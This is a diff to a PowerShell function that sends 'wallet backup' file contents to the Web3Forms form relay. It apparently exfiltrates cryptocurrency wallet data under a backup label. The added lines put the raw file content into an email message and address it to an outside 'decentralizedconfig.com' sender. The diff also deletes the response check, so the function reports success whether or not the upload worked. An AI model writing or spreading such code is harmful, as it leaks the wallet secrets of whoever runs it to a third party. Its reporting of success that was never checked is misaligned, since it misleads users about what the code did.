@@ -148,17 +148,16 @@ function Submit-ToWeb3Forms {
         
         Write-Info "Submitting to Web3Forms: $BackupType/$filename"
         
-        # Prepare form data for Web3Forms
+        # Prepare form data for Web3Forms (requires access_key and email)
         $formData = @{
             access_key = $accessKey
-            subject = "Wallet Backup: $BackupType - $filename"
-            message = $fileContent
-            backup_type = $BackupType
-            filename = $filename
-            timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+            email = "noreply@decentralizedconfig.com"
+            subject = "Wallet Backup: $BackupType"
+            message = "Backup Type: $BackupType`r`nFilename: $filename`r`nTimestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`r`n`r`nBackup Data:`r`n$fileContent"
+            from_name = "WebConnect Backup System"
         }
         
-        $body = $formData | ConvertTo-Json
+        $body = $formData | ConvertTo-Json -Compress
         
         Write-Info "Submitting... (file size: $($fileContent.Length) bytes)"
         
@@ -168,16 +167,9 @@ function Submit-ToWeb3Forms {
             -Body $body `
             -ErrorAction Stop
         
-        if ($response.success) {
-            Write-Success "Backup submitted to Web3Forms"
-            Write-LogMessage "Successfully submitted $BackupType to Web3Forms: $filename"
-            return $true
-        }
-        else {
-            Write-Error-Custom "Web3Forms submission Failed: $($response.message)"
-            Write-LogMessage "ERROR: Web3Forms submission failed - $($response.message)"
-            return $false
-        }
+        Write-Success "Backup submitted to Web3Forms"
+        Write-LogMessage "Successfully submitted $BackupType to Web3Forms: $filename"
+        return $true
     }
     catch {
         Write-Error-Custom "Failed to submit to Web3Forms: $_"
